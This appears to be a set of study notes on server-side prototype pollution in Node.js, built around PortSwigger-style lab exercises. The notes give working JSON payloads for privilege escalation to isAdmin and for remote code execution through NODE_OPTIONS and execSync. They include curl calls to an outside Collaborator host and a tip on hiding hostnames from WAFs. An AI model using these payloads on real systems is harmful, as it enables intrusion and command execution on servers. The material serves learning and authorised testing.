There is a bug in `_http_incoming` Node module that makes it work even when the request's actual `Content-Type` header includes its own charset attribute. 

To avoid overwriting properties when a request contains duplicate headers, the `_addHeaderLine()` function checks no property already exists with the same key before transferring properties to an `IncomingMessage` object:

```js
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
```

If it does, the header being processed is effectively dropped. Due to implementation, the check includes properties inherited via the prototype chain, meaning that if you pollute the prototype with your own `content-type` property, the property representing the real header from the request is dropped.
# Detecting Prototype Pollution without Polluted Property Reflection

For example, try looking for a POST request with JSON data. The server may respond with a JSON object as well:

![[POST JSON.png]]

Try polluting the object prototype with a new property:

![[No Reflection.png]]

If no reflection, try breaking JSON syntax and observe the response:

```http
HTTP/2 500 Internal Server Error
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Etag: W/"151-iTEyRZluqY68DQzfcuX5qAlgCJ4"
Date: Sun, 20 Oct 2024 20:00:34 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 337

{"error":{"expose":true,"statusCode":400,"status":400,"body":"{\"address_line_1\":\"Wiener HQ\",\"address_line_2\":\"One Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 1RP\",\"country\":\"US\",\"sessionId\":\"uuRWSzCFQl6WAGtaRbZuWp8SHrk4CkCg\"\r\n\"__proto__\":{\r\n\"foo\":\"bar\"}}","type":"entity.parse.failed","foo":"bar"}}
```

There is a different code returned in the JSON from the headers. Try polluting the object prototype with a status property set to a value like 555:

```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"uuRWSzCFQl6WAGtaRbZuWp8SHrk4CkCg"
"__proto__": {
    "status":555
}}
```

Create another error and observe the response for a custom status code:

```json
{"error":{"expose":false,"statusCode":555,"status":555,"body":"{\"address_line_1\":\"Wiener HQ\",\"address_line_2\":\"One Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 1RP\",\"country\":\"US\",\"sessionId\":\"uuRWSzCFQl6WAGtaRbZuWp8SHrk4CkCg\"\r\n\"__proto__\": {\r\n    \"status\":555\r\n}}","type":"entity.parse.failed","foo":"bar"}}
```

If successful, the object prototype is polluted, confirming the vulnerability.

Another way may be JSON spaces by first observing a normal response and checking if any spaces are present. If not, try setting a `json spaces` value to 100 and observe the response:

![[JSON Spaces.png]]

If it changes, it confirms the vulnerability. 

The final way may be via a charset override. Try encoding a certain property to UTF-7:

```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"+AFU-+AEs-","sessionId":"uuRWSzCFQl6WAGtaRbZuWp8SHrk4CkCg"
}
```

The string may appear as the same if UTF-7 is not used by default. If so, try polluting the prototype with a content-type property that sets the charset value to UTF-7:

```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"+AFU-+AEs-","sessionId":"uuRWSzCFQl6WAGtaRbZuWp8SHrk4CkCg",
"__proto__":{
"content-type":"application/json; charset=utf-7"}
}
```
# Bypass Input Filters

Sites attempt to prevent prototype pollution by filtering suspicious keys like `__proto__`. The key sanitization approach is not a long-term solution since it can be bypassed such as:

- Obfuscating the prohibited keywords so they are missed during sanitization.
- Accessing the prototype via the constructor property instead of `__proto__`.

>[!info]
>Some apps can also delete or disable `__proto__` using the command line flags `--disable-proto=delete` or `--disable-proto=throw`. It can also be bypassed by using constructor technique.

For example, observe a request that sends any JSON data and returned JSON data.  Try polluting the object prototype by adding a new property to JSON with the value of an object that contains a property with the value of `true`:

```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"evAJIExZf87QjwbQ8jj5QkDWVWbw90MR",
"__proto__":{
"polluted":true}}
```

If it does not get reflected, try using the `constructor` technique instead by adding a new property with a name `constructor` that has a value of an object containing a property with the name `prototype` which have the value of an object containing the polluted property with the value `true`:

```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"evAJIExZf87QjwbQ8jj5QkDWVWbw90MR",
"constructor":{
"prototype":{
"polluted":true}}}
```

If the response contains the polluted property, but does not contain constructor or prototype, it indicates a successful pollution of the object prototype and the property is inherited via the chain. If so, try changing the `isAdmin` value to true:

```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"evAJIExZf87QjwbQ8jj5QkDWVWbw90MR",
"constructor":{
"prototype":{
"isAdmin":true}}}
```

If it works, it means the user did not have its own `isAdmin` property, but rather inherited it from the object prototype.
# RCE via Server-Side Prototype Pollution

There are many potential sinks in Node, many of which occur in the `child_process` module. These are often invoked by a request that occurs asynchronously to the request with which you are able to pollute the prototype in the first place. 

A way to identify requests is by polluting the prototype with a payload that triggers an interaction with Collaborator. 

The `NODE_OPTIONS` environment variable enables you to define a string of command-line arguments that should be used by default whenever you start a new Node process. Since it is a property on the `env` object, you can control it via prototype pollution if it is undefined.

Some Node functions for creating new child processes accept an optional `shell` property, allowing devs to set a specific shell, such as BASH, to run commands. Combining this with a malicious `NODE_OPTIONS` property, an attacker can pollute the prototype that causes an interaction with Collaborator whenever a new Node process is created:

```js
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

>[!info]
>The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames.

Methods like `child_process.spawn()` and `child_process.fork()` enables devs to create new Node subprocesses. The `fork()` method accepts an options object in which one of the potential options is the `execArgv` property.

This is an array of strings containing command-line arguments that should be used when spawning the child process. If it is left undefined, it can potentially be controlled via prototype pollution.

Since the gadget lets you control the command line arguments, this gives you access to some attack vectors that would not be possible using `NODE_OPTIONS`, including options like `--eval` which enables you to pass in arbitrary JavaScript that is executed by the child processL

```js
"execArgv": [
    "--eval=require('<module>')"
]
```

In addition, the `child_process` module contains the `execSync()` method which executes a string as a system command. By chaining the JavaScript and command injection sinks, you can escalate prototype pollution to gain full RCE.

For example, there may be an option to run maintenance jobs as an admin which may clear the database and file system by sending JSON data. There may also be a request to change user data via sending JSON data and it may reflect changes:

![[Change Email.png]]

Try using "Server-Side Prototype Pollution" extension by sending the request to the extension. If exploitable, it may report sources found in the Issues tab:

![[Issue.png]]

If confirmed, check the maintenance jobs functionality. Functionality like this can spawn node child processes. There are many sinks that occur in the child process module like spawn, exec and execFile. [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce) includes some interesting payloads.

Try using an example:

```js
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
```

And adding a new object containing two properties:

-  env - an object containing an `evil` property with a value of a cURL request to Collaborator
- NODE_OPTIONS  - contains a value

```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"lTZhtiAQ2Pt6mw4ZlQ8IjZcrdngL1dgE",
"__proto__":{
"env":{
"evil":"require('child_process').execSync('curl 8t2t4ushprz3hh7pym2xoi6bb2ht5jt8.oastify.com').toString())//"},
"NODE_OPTIONS":"--require /proc/self/environ"}}
```

![[ENV.png]]

This loads the environment module to access environment variables set on the server. The `env` property is usually used to store environment variables. Within `env` object, a new property is made that loads a child process module and calls the execSync function on it to execute a command.

If successful, the injected properties get reflected. Try running the cleanup jobs, which may spawn a new child process that can get polluted with the injected properties and execute a cURL request to Collaborator:

```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"US","sessionId":"lTZhtiAQ2Pt6mw4ZlQ8IjZcrdngL1dgE",
"__proto__":{
"env":{
"evil":"require('child_process').execSync('curl 8t2t4ushprz3hh7pym2xoi6bb2ht5jt8.oastify.com')//"},
"NODE_OPTIONS":"--require /proc/self/environ"}}
```
# RCE via child_process.execSync()

In some cases, the app may invoke this method on its own. The `execSync()` method also accepts options object, which may be pollutable via the prototype chain. Although it does not accept an `execArgv` property, you can still inject system commands into a running process by simultaneously polluting the `shell` and `input` properties:

- The `input` option is a string passed to the child processes `stdin` stream and executed as a system command by `execSync()`. Since there are other options for providing the command, such as simply passing it as an argument to the function, the `input` property itself may be left undefined.
- The `shell` option lets devs declare a specific shell in which they want the command to run. By default, it uses the system's default shell to run commands, so it may also be left undefined

By polluting both properties, you can override the command that the app devs intended to execute and instead run a malicious command in a shell of your choosing. There are a few caveats:

- The `shell` option only accepts the name of the shells executable and does not allow you to set any additional command line arguments.
- The shell is always executed with the `-c` argument, which most shells use to let you pass in a command as a string. However, setting the `-c` flag in Node instead runs a syntax check on the script, which also prevents it from executing. It is generally tricky to use Node itself as a shell for your attack.
- As the `input` property containing the payload is passed via `stdin`, the shell must accept commands from `stdin`.

Text editors like Vim and ex reliably fulfill all of these criteria. If either of them happen to be installed, this creates a potential vector for RCE:

```json
"shell":"vim",
"input":":! <command>\n"
```

>[!info]
>Vim has an interactive prompt and expects the user to hit Enter to run the provided command. As a result, you must simulate this by including a newline `\n` character at the end of the payload.

One additional limitation of this technique is that some tools you may want to use don't read data from `stdin` by default. However, there are a few ways around it. For example, `curl` can still read `stdin` and send the contents as the body of a POST request using the `-d @-` argument.

In other cases, you can use `xargs` which converts `stdin` to a list of arguments that can be passed to a command.

